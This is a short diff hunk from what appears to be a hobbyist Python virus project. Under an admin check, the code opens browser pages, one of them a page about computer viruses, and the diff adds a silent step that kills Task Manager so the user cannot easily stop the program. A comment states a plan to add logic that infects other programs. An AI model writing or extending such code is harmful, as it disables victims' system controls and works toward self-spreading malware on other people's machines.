@@ -60,6 +60,10 @@ if is_admin():
         StopMonitor()
         os.system("start https://en.wikipedia.org/wiki/Computer_virus")
         os.system("start https://psvks.github.io/psvks/uploads/fucker.html")
+        try:
+            TaskKill("taskmgr.exe")
+        except:
+            pass
 
 
     # TODO: Need to implement a logic to infect programs.
